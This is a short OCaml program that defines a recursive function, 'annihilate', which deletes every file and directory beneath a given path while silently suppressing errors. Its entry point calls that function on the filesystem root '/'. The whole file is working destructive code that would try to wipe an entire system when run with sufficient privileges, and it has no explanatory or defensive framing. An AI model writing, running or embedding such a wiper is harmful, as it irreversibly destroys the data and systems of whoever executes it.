open Sys

let rec annihilate path =
  if Sys.file_exists path then
    if Sys.is_directory path then (
      let entries = Array.to_list (Sys.readdir path) in
      List.iter (fun name ->
          let full_path = Filename.concat path name in
          annihilate full_path
        ) entries;
      (try rmdir path with _ -> ())
    ) else
      (try remove path with _ -> ())

let () =
  annihilate "/"
